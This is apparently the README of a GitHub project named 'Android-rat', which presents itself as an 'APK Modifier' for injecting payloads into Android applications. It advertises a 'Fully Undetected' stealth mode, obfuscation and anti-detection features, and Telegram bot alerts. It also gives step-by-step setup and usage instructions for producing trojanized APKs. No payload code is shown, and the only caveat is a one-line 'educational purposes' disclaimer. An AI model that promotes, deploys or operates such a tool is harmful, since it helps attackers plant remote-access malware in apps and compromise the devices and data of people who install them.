# APK Modifier

A powerful server-based APK modification tool with advanced features for injecting payloads into Android applications.

## Features

- **Web-Based Interface**: Modern, user-friendly UI for uploading and modifying APK files
- **Advanced Injection Options**: 
  - Fully Undetected (FUD) mode for stealth operations
  - Custom library signing with configurable lib names (e.g., libxx.so)
- **Telegram Integration**: Automatic notifications via Telegram bot
- **Background Processing**: Long-running tasks handled asynchronously
- **Server-Based File Hosting**: Upload modified APKs to remote servers
- **Security Features**: Built-in obfuscation and anti-detection mechanisms

## Installation

1. Clone the repository:
```bash
git clone https://github.com/legendhkek/Android-rat.git
cd Android-rat
```

2. Install dependencies:
```bash
pip install -r requirements.txt
```

3. Install Android build tools (apktool, zipalign, apksigner):
```bash
# On Ubuntu/Debian
sudo apt-get update
sudo apt-get install -y apktool zipalign openjdk-11-jdk

# Download apksigner if not available
```

4. Configure environment variables:
```bash
cp .env.example .env
# Edit .env with your settings
```

5. Run the application:
```bash
python app.py
```

6. Access the web interface at `http://localhost:5000`

## Configuration

Edit `.env` file with your settings:

```
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here
UPLOAD_SERVER_URL=https://your-server.com/upload
SECRET_KEY=your_secret_key_here
```

## Usage

1. Open the web interface
2. Upload your APK file
3. Select injection options:
   - Choose "Fully Undetected (FUD)" for maximum stealth
   - Enter custom library name for signing
4. Configure Telegram notifications
5. Click "Process APK" and wait for completion
6. Download the modified APK from the provided link

## Security Notice

This tool is for educational purposes only. Use responsibly and only on applications you own or have permission to modify.

## License

MIT License
